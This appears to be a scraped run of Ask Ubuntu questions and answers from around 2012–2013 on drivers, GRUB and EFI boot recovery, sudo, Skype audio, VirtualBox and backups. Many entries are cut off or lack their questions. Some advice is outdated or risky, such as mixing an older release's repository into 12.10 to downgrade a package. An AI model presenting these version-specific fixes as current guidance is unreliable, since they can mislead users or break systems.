From what I've read and experimented with there's no more support for older ATI Mobility cards. I resolved a few boot issues with my first install of Ubuntu 12.10 (now on clean install #3) and my system seems to function okay with video unknown. Picture quality is good and no issues with video playback. It functions for my purposes.\nShould I leave it as is... or will this cause problems I'm not aware of?\n\nA: Nope!  If it works, it works.\nThe only thing you might want to consider is that your card may be able to perform better with a specific driver.  With that card, I think the consensus view is to use the radeon driver.  You can install it with:\nsudo apt-get install xserver-xorg-video-radeon\n\nIt's probably already installed; Ubuntu does most of the work for you in this respect.  You can run that for a little peace of mind though!\n\nA: Personally, I don't see that to be a major cause of panic though. My computer (Aspire 1 notebook), after install ubuntu 12.10, says my graphics card is unknown but functions okay.

What is the best way to fix this in Ubuntu 10.04\n\nA: I know it sounds dumb, and I am by no means an expert, but have you tried resetting your computer or router? Also, have you tried the new LTS release 12.04? You can try it via a live usb and see if it fixes your issue. If so, you may want to consider upgrading. Furthermore, did you install any programs or updates before you last shutdown the computer?\nI know the above sounds like your standard IT suggestions, and are perhaps obvious, but if you haven't tried them you may be pleasantly surprised. In my experience as an \"average user\" (with limited command line knowledge), often a simple restart fixes the problem. Also, try reconnecting to the network and pining sites to \"force\" an internet reconnection.\n\nA: Things to try... \nPut your laptop on wall power. \nDoes the laptop have a wireless kill switch?

At the moment of writing this has a very low priority and is unassigned...\n\nA: You should be able to find this utility as \"Disks\" under the Settings Manager. Otherwise, the command you want is gnome-disks.\n\nA: Settings-Manager > Panel > Select \"Panel 0\" > Click on \"items\".\nSelect \"Application Menu\" and click the little gear to edit the currently selected item.\nOn the new window, click \"Edit Menu\" button.\nAnd then, everything you ever wanted happens! Simply add the software you want in the various menu items.\n\nA: Versions above 3.0.2 have been replaced with something that is totally different.  So for Ubuntu versions 12.10 and above, do this as root or sudo:\nAdd to /etc/apt/sources.lst:\ndeb http://dk.archive.ubuntu.com/ubuntu/ precise main restricted\nRun \"apt-get update\"\n\"apt-cache showpkg gnome-disk-utility\" will show you the versions available.\nThen install the specific version:\n\"apt-get install gnome-disk-utility=3.0.2-2ubuntu7\"\nDone!

I have been trying to make vector/SVG version of PNG icons I am working on. I use Path>Trace Bitmap to create vector versions of my PNG. My issue is that it does not retain the white area within the icon. How can I use Inkscape to fill in the empty area with white?\n\nLeft SVG, right PNG\n\nA: I usually create a white rectangle which I put in the background of my graphic. You can put this to a seperate layer if you like, so that you don't interfere with it when editing the other stuff.\nYou can also change the Background color in the \"File\" -> \"Document Properties\" dialog (on the first tab, named \"Page\")\nbut I like the rectangle method more, because sometimes I like to keep parts transparent and I feel it makes me more flexible.\n", "Q: How can I get an interactive shell as another non-root user? I'm using Ubuntu 10.04 LTS server, with the default security model (root locked, using sudo to elevate privileges). I occasionally enjoy using sudo -i when I'll need to run a series of commands with elevated privileges, or when I need to rummage around in directories with root-only privileges.\nSometimes, when setting up software that'll run as its own non-privileged system account (adduser --system --group --no-create-home --disabled-login some-daemon-user) I find that I need to run a sequence of commands as that user, rather than myself or root. I've tried using sudo -i -u some-daemon-user, but it just returns a 1 status without any error message.\nI've checked the syslog, messages, auth, and debug log files in /var/log and none of them include any messages that reference sudo or the account in question.\nSo, is it possible to become another non-root user, sudo-style without just setting a password and logging in (as them)? Is my system 'broken' in some way or am I just doing it wrong?\n\nA: sudo -i runs the shell specified by the password database entry of the target user, which is /bin/false for your system user.\nUse\n sudo -u some-daemon-user bash\n\nor \nsudo -u some-daemon-user -H bash\n\nif you want to set the $HOME environment variable set for the target user.\n\nA: Ahmm.. the problem is that the standard shell of those users is normally set to /bin/false and for security reasons you should not change this. But you can still run for example: sudo -u www-data /bin/sh\n", "Q: Is it a must to download and install all packages when install Ubuntu 12.04? I am installing Ubuntu 12.04 LTS on a Dell Latitude D620 laptop, using a USB stick. What I can see during the installation is that it is downloading packages from the internet, including language packs. I go ahead and click that 'skip' button then restart. But there comes a system error after I log in, plus I can't open 'additional drivers'.\nThe error's not gone until an 'sudo apt-get update'+'sudo apt-get upgrade'+'sudo apt-get dist-upgrade', and after that I can open 'additional drivers' to install nVidia drivers.\nSo my question is, is it a must to download and install all packages during installation? If it is, why does Ubuntu provide a button 'skip'?\n\nA: I'm not sure if \"Downloading\" in this part of the dialog isn't rather refering to \"downloading\" from the CD. Normally you would have selected \"Download Updates\" on the first page of the dialog.\nOnly downloading the updates can be a lot of data however. If you are using third party components like proprietary nvidia drivers, it could be that those have to be downloaded from the internet.\nIf you leave all option boxes on the first dialog page unchecked, there should be no downloads from the internet at all. If you read the phrase \"downloading\" then, you can be sure it's refering to copying from the CD.\nIf you don't download and install updates during the installation, then updating should be the first thing to do after you boot your new Ubuntu.\n\nA: No. It's not a must. It is optional.

But that's definitely not the case as all 3 different ISO images that I downloaded of Ubuntu server 12.04 LTS (32-bit) can't be corrupt!\n\n*Just to make sure that the Image does not have problem I used that Image to install it for testing on stand alone system. it works fine there!\n\n*This is a production ESXi server which I can't play with, however I can play with the Ubuntu Server 12.04 LTS (32-Bit) VM that we have created on that ESXi. \n\nHere is more information for another attempt: \n\n\n*\n\n*For this install, I've given 1 core of the XENON processor, 1 GB of RAM and 20 GB of HHD.\n\n*I have used LVM with the automatic partition manager (where I do not have to create partitions manually). \n\n*I do not have any working Ubuntu 12.04 LTS image installed anywhere. :( \n\n*I tried installing Ubuntu 12.10 on the same VM which worked well, however that is of no use to me as I need Ubuntu 12.04 LTS only for testing purpose.\nPlease let me know if you need any further details. \nI need help on this as soon as possible, as the go live date of this server is really close.\n\nA: I got exactly the same GRUB boot loader error message when trying to install Ubuntu 12.04 LTS Server under VMware Player 4.0.3.\nI then went back to basic installation and at a certain moment you are asked which kernel you are going to use. I chose the second option, i.e. linux-virtual and then it proceeded to reinstall basic services as well as grub and Ubuntu login screen came up.\nI keep using 4.0.3 since it seems to be the last version containing vmnetcfg.exe in its cab folder which can be extracted with /e switch, as VMware stopped including this in the newer versions. VMware Player 5 certainly does not have it.\nOf course you can opt to use VMware Workstation 8.0 or 9.0 if the money were not the issue.\n\nA: Did you set up your partitions manually?  I had a similar issue running on VirtualBox, and I had to go through the manual partition setup, which allowed me to set the primary partition's bootable flag to Y (why that isn't the default, I'm not sure).  Then I selected to reinstall the Linux file system and was later prompted to select a Linux kernel to boot to, followed by a prompt to install GRUB, which succeeded.  The auto-setup appears to skip one or more of the above steps.  FWIW, the Linux kernel I selected was the linux-virtual kernel -- not being too knowledgeable on the difference between that and the generic-pae version, I can at least say it booted up and appears to be functioning well.\n\nA: RAM and processor should be irrelevant, as this is a hard disk (grub) message.   Can you not re-use an image from a previously working install?  If you have given 20G of disk space for the instance, I would think that is sufficient.  \nIf all else fails, try cloning an existing, running image and then customize it.  Be careful to change IP addresses before you attempt to bring it up in this case. \nSince you have been using LVM, I would try without it at least as a test.\n", "Q: What is the current state of Ubuntu's transition from init scripts to Upstart?

if I'm interpreting the division of responsibilities properly, as I didn't expect to see any overlap (of what framework handles which services). So I was quite surprised to learn that there was a significant amount of overlap in service references, in addition to being unable to discern which of the two was intended to be the primary service framework.\n\n\n*\n\n*Why does there seem to be a fair amount of redundancy in individual service handling between init.d and upstart? Is something else at play here that I'm missing?\n\n*What is preventing upstart from completely taking over for init.d? Is there some functionality that certain daemons require which upstart does not yet have, which are preventing some services from converting? Or is it something else entirely?\n\nA: Many packages whose services were controlled using initscripts before they were ported to Upstart continue to ship an \"initscript\" in /etc/init.d/ which is actually a symbolic link to /lib/init/upstart-job which translates initscript syntax to approximately equivalent upstart syntax. On my system, for example, 51 of the 90 \"initscripts\" are actually symbolic links to /lib/init/upstart-job.\n", "Q: Printing is delayed in 12.10 I use Ubuntu 12.10 on my laptop (Intel CORE 2 DUO @ 2.0 GHz, 2 GB RAM) with a network printer (Brother MFC-8710DW) and the printing is very delayed.

Even more, after doing a copy action, right-clicking on the context menu shows \"Paste\" menu entry to be greyed out (disabled) - as if there is no data whatsoever on clipboard!\nSo, first I checked synergy versions on both machines, and it turns out they don't match (even though that was probably the case also previously in time, when I used the same setup, and everything was working).

The internal mic is not working, while the external mic is. At the same time, other recording software (like gnome sound recorder, audacity or guvcview) are working ok with both inputs (internal and external).\nDo you have any idea why this can be?\nIn the Skype configuration, 'allowing Skype to manage my volume control' is unchecked. If I check it, Skype turns mic and boost volume to the maximum, but it's not good (a lot of cracks and my voice on the background almost inaudible).\n\nA: It's solved. The problem was with pulseaudio, so i made an script like this:\n#!/bin/bash\nkillall pulseaudio\nskype\n\nto kill pulseaudio before invoking skype. I also had to create a file ~/.pulse/client.conf with the following line:\nautospawn=no\n\nto avoid pulseaudio to restart automatically when i invoke the kill command.\ncheers!!!\n\nA: There is another solution that doesn't involve killing pulseaudio. You have to unlink the input channels, turn left channel totally down, and regulate input volume just with right channel.\n", "Q: Can't play mp4 files in Edubuntu 12.04 I have installed new Edubuntu 12.04 and unfortunately my mp4 files are not running.\n\nA: Type this command in terminal (press ctrl+alt+t to open) \nsudo apt-get install ubuntu-restricted-extras\n\nIt will install all media codecs which are necessary for playing media files. \n", "Q: Can I dual boot two Linux distros with common boot partition? Can I dual boot two Linux distros with common boot partition? The reason I'm asking this is because I have a LVM setup with only one primary partition for /boot. \n\nA: It should be possible, but I think you're in for a painful experience. Unless you have a liveCD/USB to hand or like playing with GRUB recovery I'd try it in a VM first.\n\n\n*\n\n*An OS entry in grub specifies both the GRUB root (where the kernel image can be found, ie the device containing /boot, and the kernel command line specifies the root device to use. So, there should be no reason you can't have kernels for multiple distributions in one /boot device controlled by one GRUB configuration.\n\n\n.\nmenuentry distribution1 {\n    insmod part_msdos\n    insmod ext2\n    insmod gzio\n    set root=(hdX,msdosY)\n    linux /boot/vmlinuz-distribution1 root=UUID=uuid-for-distribution1-root\n    initrd /boot/initrd.img-distribution1\n}\n\nmenuentry distribution2 {\n    insmod part_msdos\n    insmod ext2\n    insmod gzio\n    set root=(hdX,msdosY)\n    linux /boot/vmlinuz-distribution2 root=UUID=uuid-for-distribution2-root\n    initrd /boot/initrd.img-distribution2\n}\n\n\n\n*\n\n*Providing the kernels and initrds for the two distributions are named differently, there should not be a problem with interference between the kernel images.\n\n*However, there is likely to be problems with the grub configuration. Ubuntu certainly automatically updates this each time you update grub or the kernel, and I doubt the autogeneration will handle this configuration.\n\n*You'll need to either tweak the configuration in /etc/grub.d to handle this setup, disable autogeneration or remember to manually edit it yourself each time. You probably want to uninstall grub from one of the two distributions or you'll be dealing with this problem twice.\n", "Q: Is there any Ubuntu version for PSP and PS3? Is there any Ubuntu version for PSP and PS3? If yes, where is the ISO files located?\nI think it is impressive to have Ubuntu on PSP and PS3.\n\nA: No, there is not. It is currently not possible to have Ubuntu or any other operating system on the PS3. Sony killed the 'Other OS' feature. There is an expception: the 'Other OS' feature is disabled by firmware version 3.21 but still runs on older consoles that have firmware 3.15 or lower. This would mean though that there is no access possible to PSN or any other web feature since this will prompt for a (mandatory) update. \nAny other methods installing another OS would be illegal in most countries (if not all). And even if it is not illegal... circumvent Sony's PlayStation 3 security algorithms or run unauthorized software on your PS3 and Sony will sever your access to its PlayStation Network for good. It involves hacking your PS3 but AU is not going to provide you with the instructions to do that.\n\nA: Yes for PS3 there is \" yellow dog 6.1 distro \" and here is a tutorial on how you can download and install it : http://www.youtube.com/watch?v=bkBM9sSdh50&feature=related \nhowever for psp I don't know if it works this , but for PS3 I'm sure it works .Oh ye I forgot ,yellow dog is based on linux ,but not on ubuntu , but is the only linux I know for PS3 ,however it works fine. \n\nA: Yes, I have Ubuntu installed sin 2008 in my PS3, but I didn't updated the PS3 software since 3.21.

I have a Intel Core i3-530 and Intel mobo (DH57JG), so no proprietary graphics drivers. \nThe problem is that I can't get the correct resolution to display on the TV. Initially I only had 1024x768 (or similar) as a maximum resolution, which was not displayed properly. I tried a few steps, including generating an xorg.conf (initially didn't have one) and adding the segment as described in this post regarding this particular TV. I couldn't get this to work, and at this stage have reverted to running without an xorg.conf. Another post suggested upgrading to kernel 3.5, which did give me a 1920x1080 resolution option. This results in the TV cutting off a fair bit of the edges of the screen.\nMy Dell laptop with ATI drivers recognises the TV screen and works well via HDMI.\nAny idea how to proceed?  \n\nA: That is a rather nonstandard looking resolution which might cause some difficulty, my guess would be that you would need a modeline in your xorg.conf for it, I just did some digging on this searching for xorg modeline 1366x768 and found a forum post which looks like it will probably help you out, the question there is also about configuring a mode for a TV.\nHere is the link:\nhttp://ubuntuforums.org/showthread.php?t=1480033\n", "Q: No such partition grub rescue I'm desperate. I have windows 7 home premium installed on my notebook and I decided to install ubuntu as usual. Nevertheless, I had several problems with the graphic card while installing and I got some problems and I couldnt run ubuntu properly, so I decided to uninstall ubuntu by formatting the partition and joining it to my data partition (where it originally came from). Afterthat, I cannot enter into any OS. Not even from the BIOS. But the partitions are there. There is no way, I have tried a Windows DVD to repair boot, but no repair option is offered just installation, also I tried \"lilo\" as this post said.\nI tried Super Grub Disk with no luck. Even Boot-Repair from a live-CD where I could just obtain a report.\nWhat can I do? I just want to have my windows boot as usual and then I will try again the linux installation. But I need to come back to my windows boot.\nwhat I get when I boot is:\nerror: no such partition.\ngrub rescue> _\n\nAn ls here get this:\n(hd0) (hd1) (hd1, gpt5) (hd1, gpt4) (hd1, gpt3) (hd1, gpt2) (hd1,gpt1) (hd2) (hd2,gpt2) (hd2,gpt1)\n\nIt is a new computer (asus ux32vd) and the ubuntu version I deleted was 12.10. I don't want to reinstall Windows because i'll lost my license key. I don't know what else can I do.\n\nA: MttJocy is partially correct, but there's a twist: The computer clearly uses the GUID Partition Table (GPT), which in turn means that Windows was almost certainly installed to boot in Extensible Firmware Interface (EFI) mode. On an EFI computer, GRUB doesn't install to the MBR; it installs to the EFI System Partition (ESP), which is a FAT partition that holds boot loaders. The ESP is usually the first partition on the disk. Furthermore, on an EFI computer, boot loaders normally register themselves with the firmware via an NVRAM entry. The firmware launches boot loaders based on the order in which they appear in the NVRAM. In your case, GRUB is still present in the ESP, and its NVRAM entry is still present, but GRUB's configuration files resided on a Linux-only partition and so are now inaccessible, rendering GRUB essentially useless. (IMHO, this is a bug in Ubuntu's configuration; it should put the GRUB configuration files on the ESP, not in Linux's /boot partition, to avoid precisely this problem.)\nIn any event, there are at least two solutions to this problem:\n\n\n*\n\n*You can delete GRUB from the ESP. To do this, you'll need to boot an emergency system, access the ESP, and delete the EFI/ubuntu directory on that partition. With GRUB gone, your firmware will move on to the next item in its NVRAM boot list, which will probably be Windows.\n\n*You can adjust your NVRAM entries using a tool such as Linux's efibootmgr. To do this, you'll need to boot with an EFI-mode Linux emergency disc (the Ubuntu installer in \"try before installing\" mode should work, but you'll need to do a sudo apt-get install efibootmgr to install the tool). You can then do an efibootmgr -v to see the NVRAM entries and then use the -o option to set the Windows boot loader first in the list, as in efibootmgr -o 0001 if the Windows boot loader is Boot0001.\n\n\nThese methods both assume that the Windows boot loader is still intact and that its entry still exists in NVRAM. If not, you'll have to use Windows-specific tools to re-install the Windows boot loader or to restore its NVRAM entry. The Windows installation disc should be able to do the job, but I'm not very familiar with details of its operation.\n\nA: The problem here will be that while grub itself is still present and functioning in the MBR when you formatted the partition you wiped out /boot which contains alongside the linux kernel images your grub configuration which it needs to produce the menu etc.\nYou could try manually specifying the partition of your windows install to boot and see if that works for you, as an example:\nboot (hd0)\n\nReplace hd0 with the disk and partition where windows is installed hd0 is the first HD, hd1 the second etc, partitions are numbered similarly.  If that doesn't work only thing that comes to my mind would be to run the ubuntu install again it will install a new bootloader configuration for you, not ideal if trying to remove ubuntu but it would work.\nFurther if you use the ubuntu partitioner to create a separate /boot partition needs only be around 100MB or so, probably less it would then be possible to remove the main install partition without disturbing the bootloader configuration.\n\nA: You could always download and use Resc-a-tux.\nThis is a live cd with a primary goal: Restoring grub/installing grub. It's a nice program which I used after windows just removed my grub without asking, and it worked like a charm.\nBut in your case, you are installing Grub to boot windows, which isn't a problem at all. Just press restore grub, and it will make a bootloader for you.\n\nRescatux features:\nFixes GRUB and GRUB2\nRegenerates Debian/Ubuntu grub menues\nCheck and fix filesystems\nFixes Windows MBR\nBlank Windows passwords\nBoot Info Script\nChange Gnu/Linux password\nRegenerate sudoers file\nExtra tools:\nSynaptic\nGparted 0.7\n\n\nA: This is a common problem with Windows - UEFI - Ubuntu(Linux) - GPT. \nI never had UEFI so never managed to fix it my own , just read lot of threads about it. \nHere is an example with similar problem to yours from Windows-seven forums .Also lot of threads exists at UbuntuForums.org \nI have not an easy solution , but just a thought.

None report using Ubuntu, but almost none specify exactly which Linux distribution they use.\nI suspect the majority use their own customised distributions  with both the kernel and software tailored for their hardware and major uses. My guess would be that they would use either Red Hat or Debian (as Ubuntu does) as a starting point for customisation, but this is just my supposition. \n\nA: Your other question asks how many supercomputers run Linux. You may be confused between Ubuntu and Linux here.\nAn OS used on a supercomputer is likely to be customised one way or another, although it can be based on a specific distribution. I'm not aware of any that's based on Ubuntu.\nAs this answer said, check the Top 500 stats, by \"Operating System\" and \"Operating System Family\".\nIt's hard to assess from the general \"Linux\" category what it's running.

Luckily the chances of an actual security violation occurring are low, but the possibility exists. Deja-dup backs up your files once they are unencrypted and then re-encrypts them with another kind of encryption.\nYou will have two copies of the same data in different encryption. Knowing this, a cryptoanalyst could use sophisticated pattern analysis to compare the two copies and find out what they are -- bypassing the encryption of both.\nAnother possibility is that one of the two encryptions may be weaker, even weak enough to partially reveal the content of your data, giving a cryptoanalyst clues to decrypt both copies.\nIt's even more unlikely, but an infiltrator could modify your local copy of Deja-dup to transmit the unencrypted data before re-encrypting it.\nBackintime can be configured to back up your encrypted home directory as-is, from /home/.ecryptfs/user without even knowing what it's backing up.\n\nA: Your home is unlocked once you login to your account, not before. Once that is done your files are on-the-fly un-encrypted and ready to be read by the backup utility.\nWhen you then back them up with deja-dup you are actually copying the information un-encrypted and saving it to the archive, there is also the option to encrypt the backup with a password, but that has nothing to do with ecryptfs.\n\nA: You should be able to back up as normal as long as the ecryptfs container is unlocked and open at the time so that deja-dup can access the files if you are not logged in at the time and the container is locked then I'm not sure.\nIf it backs up while the container is open then they wont be encrypted at least not by ecryptfs, you can have deja-dup encrypt the backup archives has been a while since I used it but if I recall correctly deja-dup supports GPG encryption.\n", "Q: I cannot see the drives on my computer I'm a new Ubuntu user and I installed this Ubuntu 12.04 from a USB stick.

It was a fresh install, alongside Windows XP. On grub, after choosing normal boot on ubuntu, it starts loading things, but before starting the Ubuntu loading screen (with the dots) it stops flashing HDD activity led, and hangs there, and I need to hard shutdown the laptop. However, if I choose recovery mode on grub, and then choose Normal Boot on the options screen, it starts, but it doesn't allow to choose the native screen resolution (1440x900).\nHow can I solve the problem on normal boot? How can I grab more information about the reason it hangs? I thought that starting in recovery mode it showed the reason, but it starts and doesn't hang, so I can't extract any information about the issue.\nCan you help me?\nThank you!\n\nA: Please read here how it is solved: (I haven't tried yet, I'm just posting someone's solution)\nhttps://askubuntu.com/a/211040/101867\n\nA: I had this before.\nTry to do this in your terminal:\nsudo nano /etc/default/grub\n\nLook for:\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash\"\n\nChange it too :\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"\n\nAnd update Grub:\nsudo update-grub\n\nThis should fix stuff.\n\nA: Because the drivers (fglrx) are supported only to Xorg server version 1.12, and Ubuntu 12.10 comes with Xorg server version 1.13, it doesn't work.\nRead here: What is the correct way to install proprietary ATI Catalyst Video Drivers (fglrx) directly from AMD?\nSo, the solution is either downgrade Xorg version to 1.12 and keep Ubuntu 12.10 or stick with Ubuntu 12.04 and wait until fglrx supports Xorg version 1.13 and then upgrade to 12.10.\n\nA: It's correct that the proprietary drivers from ATI wont support your card Radeon x2300 Mobility after 12.04 as discussed above. ATI dropped support,and there are some hacks floating around on how to downgrade x-server and stuff and maybe get it working in versions above 12.04 - I never did. Did you?\nHowever, the open source driver does work, and it works quite ok for this card up until kernel 3.2x - unfortunately, after that it seems some regression has sneaked in and it hasn't worked since. \n12.10 use kernel 3.5x-series, 13.04 uses 3.8x series and the problems still there.\nMaybe you could help out with a bugreport here. https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1180557\nWORKAROUNDS:\nIf you add \"nomodeset\" in your boot-config after \"quiet splash\" it will probably work, but you'll get low-resolution etc.\nOr, if you upgraded Ubuntu from 12.04 and kept your old kernels, you can boot even 13.04 with the 3.2x kernel. I do, and no visible problems so far. That's the solution I Would recommend for now. (And reporting the regression)\nUPDATE: This problem is now a confirmed bug, https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1180557 and seems to be upstreams,and even in the latest kernels for next version of Ubuntu.

There are several steps involved in this process, so I'm going to take an educated guess at what might be holding you up.\nUbuntu is not on Oracle's list of officially-supported Linux distributions, and the installer is smart enough to figure that out.

X works fine, but I if I press Ctrl+Alt+F1 the screen turns black and no login prompt appears. Its definitely a graphic driver issue because the screen is completely black. Not even a blinking text cursor. Just black, I can switch back to X however. That's fine.\nI'd like to upgrade and install the NVIDIA display driver from the CUDA 5.0 production release. But here comes the tricky part: The new display driver can only be installed with no X running. However, if I run init 1 (to turn off X, networking, etc.) the screen remains black. I have to reboot in this situation.\nNow, if I change the default runlevel temporarily to 1 so that X doesn't start, then I fear that the display driver cannot display anything just like in the above cases. And this would be very bad since then I don't know how to recover from this state. And actually it is very likely that I run into this because there was never a text output seen on my system when NVIDIA driver is active.\nWhat are my options?\n\nA: I believe that the driver is started along with X itself as such it should not start if the computer boots directly into runlevel 1 that said this is assuming it really is the driver causing the issue here which I can't confirm for sure.\nIf it helps I can give you an option to recover if you decide to try it and it fails, before you start download the latest live CD and have a copy burned ready to go on standby.  Booting using that will allow you to mount your hard drive partition and reverse the configuration change.

I want to run and install some applications on my Linux distributions on the VirtualBox. So what is better 'live' versions or full installs on the VirtualBox? What is the difference between the two (regarding features and required configurations)?\nI use, Toshiba Satellite p755-s5215:\n\n\n*\n\n*RAM: 5GB\n\n*Processor: Intel i3\n\n*CPU: 2.10GHz\n\n*Graphics: Sandybridge Mobile\n\n*OS: 64bit\n\n\nA: I'd recommend installed versions. Reasons:\n\n\n*\n\n*You can keep them lean and fast by uninstalling unneeded software\n\n*Installations make better use of your hardware profile (e.g. 64bit/32bit, CPU) \n\n*Pre-built images of major distribution installations are available for download, here or here\nLive versions are usually reset to factory settings when rebooted, so they might be no use for you anyway. \n\nA: Let me outline two exemplary cases of running Ubuntu in Virtual Box:\n\n\n*\n\n*Occasional testing of softwares in different Ubuntu versions\nWe may not want to take the time, and we may not have the hard disk space for a full installation. In this case we may just boot a live session where we install our application for testing. This installation will not be available after a reboot of our VM (but of course it will survive a snapshot).  \nDisadvantages:\n\n\n*\n\n*The guest OS is not upgraded, therefore bugs will not have been fixed\n\n*No acess to features from guest additions (i.e. 3D graphics)\n\n*Installation of additional librariers or software are volatile\n\n\n*Testing software on a customized guest OS\nIn case our software has additional dependencies, or we need additional applications for debugging we may not want to load them each time we install the application but rather have an upgraded or customized guest OS for testing purposes.\nDisadvantages: \n\n\n*\n\n*Time needed for installation  \n\n*Some hard disk space needed for the VM image\n\n\n\nWe can see that it depends much on the use case when a live system or a full install may be better. \nI have both of them at hand to decide this from case to case. \nDue to restrictions from a virtualized OS you will never have the performance you have from an installation on bare metal. If performance or 3D capability matters I'd therfore  recommend a dual boot installation.\n\nPre-built virtual machines with Ubuntu as a guest OS are not recommended:\n\n\n*\n\n*These machines are customized in a way we can not control (worst of all they will have a predefined fixed hard drive space).\n\n*There is no guarantee that these machines are free of unwanted additions. \n\n*They do not come with an up-to-date upgraded Os, which is a further security issue.\n\n*They are not built on the most recent Virtual Box version, therefore guest additions will have to be reinstalled.\n\n\nThere is not really a benefit from these prebuilt machines as the downloads are much larger as compared to the Ubuntu installation CD. In my experience the additional time for download, and the need for additional tweaking to meet our needs (upgrading, setting locale, set up users, etc.) outweighs far the time you'd need to just install Ubuntu from scratch (should take roughly 20 mins.). \nNote that even the most known site for pre-built virtual machines, VirtualBoxes will let you perform a real installation from their download as can be seen from the following note:\n\nthe installation is done from the CD, with default parameters set.\n\n", "Q: Merging chat history from Windows to Linux (.db to .lock) I want to merge my Skype chat history from a Windows version, which comes in a file called main.db inside my personal folders, with my main.lock file, found in my hidden Skype folders on my home computer.  I'm running Linux Mint and Ubuntu both on 32-bit 12.04.\nAlternatively, I may need to simply replace the current .lock file with a converted version of the older .db file. Is there a way I can do this instead?\n\nA: The .lock file should only be present when Skype is running.\nYou can likely just replace the .db file with the one from Windows, but I don't know if the data is 100% consistent across platforms in there. You could also just use the sqlite3 console tool to export from the one database, and then import the resulting data into the existing main.db file on Linux.\nHowever, beware that you may indeed break Skype, and might have to start over.\n", "Q: Can't Boot Properly from USB After I boot from my USB it starts to write a log, and freezes at some code that says something like novea drm if I remember correctly, the .iso works fine on a virtualpc. Does anyone know what's wrong?\n\n\nA: That's probably Nouveau DRM and without more info, it sounds like a corrupted file/sector. \nTry putting your USB drive into another computer and run a scan on it to ensure it's not going bad, then reinstall Ubuntu on it and try booting to it again.\nEdit: Given your comments, I'd venture to guess your computer's USB controller is going bad. You mention that it tries to detect the mouse and keyboard but eventually skips them. Can you tell if it actually finds the mouse and keyboard (sometimes, there's a [okay] or [fail] on the line in question)? If they're not being detected, then it's possible the USB controller is going bad. If they are, then go to Edit 2.\nIf the USB controller is going bad, that means the motherboard as a whole is going bad, and while you could keep it running for a while, it's only a matter of time before it gives out completely. Now would be a good time to start shopping for a new computer (or digging up your warranty information if your computer is new enough).\nEdit 2: Now that you've posted an image, I found this forum topic that may be of use to you. In short, it may be an issue with your graphics card. You can adjust your settings at boot when at the Grub boot menu. The ubuntuforums has a good tutorial on how to change boot time settings.\nSpecifically, it says this about nomodeset and nVidia drivers:\n\nnomodeset\n  The newest kernels have moved the video mode setting into\n  the kernel. So all the programming of the hardware specific clock\n  rates and registers on the video card happen in the kernel rather than\n  in the X driver when the X server starts.. This makes it possible to\n  have high resolution nice looking splash (boot) screens and flicker\n  free transitions from boot splash to login screen. Unfortunately, on\n  some cards this doesnt work properly and you end up with a black\n  screen. Adding the nomodeset parameter instructs the kernel to not\n  load video drivers and use BIOS modes instead until X is loaded.\nNote that this option is sometimes needed for nVidia cards when using\n  the default \"nouveau\" drivers. Installing proprietary nvidia drivers\n  usually makes this option no longer necessary, so it may not be needed\n  to make this option permanent, just for one boot until you installed\n  the nvidia drivers.\n\n", "Q: Poor battery life in Ubuntu 12.10 on Toshiba p755-s5215, how can i manage background applications?

When I installed Apache and PHP on Ubuntu it was done with root meaning it got permission. So I changed that to me. Now I've just copied a big number of files, (PHP), to be viewed and edited in these directories. Now my problem: I can not view the files from var/www/ because it requires, for some reason, everyone to have access to the files. Not only me, or my group but everyone. No one else is using the computer but me, so I'm cool with it. Though I need a command to change ALL files permission recursively. When I've browsed the questions already been answered I find for example chown -R viktor:viktor /var/www/, or using sudo as well.\nThis worked on the single var/www and the folders inside but not the files inside the folders and very odd I notice I can't do the same thing on example /var/www/dev/.\n\nA: I actually suggest NOT following Evandro's answer, because not only does it give permission to yourself, it gives open permission to any application or entity on your computer, including those which may have malicious intent. Especially if you're running a web server, you'll want to avoid having open permissions like that.

As I have no GUI on the server is there a way to set the server idle time via the commandline/config file?\nI will send the server a wake-on-lan packet to wake it up, if it is suspended and I need to use it.\n\nA: OK, there is the hibernate program, which can send your computer to suspend or hibernate from commandline. Determine if your computer is \"idle\" is going to be trickier.\nOn a graphical desktop you would use mouse and keyboard input. Obviously in this scenario this is out of the question.\nYou should start by writing a shellscript, doing some custom idle checks. You can call this script via a cron job every 5 minutes or so.\nYou could consider your server idle, if no users are logged in (check this with who) or if there are no network connections in use (check with netstat) or if the cpu load is low (check for example with top -n 1 -b). You will have to find your own heuristics.\n\nA: If you go to System>Preferences>Screensaver you can set the idle time there. Just set the preferred time on the bar!

Assuming I need to set up a 1TB iscsi.storage, how much space should I allocate for  iscsi.config?\n\nA: What you do it establish a small filesystem and replicate it using DRBD; then make sure this filesystem is the first one to be enabled by the DRBD primary using Heartbeat, Pacemaker or similar product. In this file-system you keep the configuration file directories that will be shared across both servers.  I do this for Samba and iSCSI.  \n/etc/samba --> /mnt/configfs/samba\n/etc/iet --> /mnt/configfs/iet\nOn the primary server, mount the filesystem and then establish the symlinks. I will typically preserve the base directories (mv /etc/samba /etc/samba.original) before I establish symlinks. Once complete and everything is working you need to transfer DRBD primary to your secondary server, mount the shared file-system and establish the symlinks on that server.\nAt this point you should be able to enable your HA services on the DRBD primary and subsequently add any additional filesystems as you build-up the server capabilities.\n", "Q: Strange space in Lubuntu desktop As you can see on the image below, I have got a large space in the panel.

This Article addresses the latter and proposes a solution.\n\nExcerpt:\n\nTo make your life easier, you can make a simple change to the MySQL\n  configuration file /etc/my.cnf that will permanently set the socket\n  file used by the mysql client. After making a backup copy of\n  /etc/my.cnf, open it in your favorite editor. The file is divided into\n  sections such as\n\n[mysqld] datadir=/usr/local/mysql/data\nsocket=/var/lib/mysql/mysql.sock\n\n[mysql.server] user=mysql basedir=/usr/local/mysql\n\n\nIf there is not currently a section called [client], add one at the bottom of the file and copy the socket= line under the [mysqld]\n  section such as:\n[client] socket=/var/lib/mysql/mysql.sock\n\nIf there is already a [client] section in the my.cnf file, add or edit\n  the socket line as appropriate. You won’t need to restart your server\n  or any other processes. Subsequent uses of the mysql client will use\n  the proper socket file.\n\n", "Q: How do I enable SSL in Cherokee without libcherokee-mod-ssl?

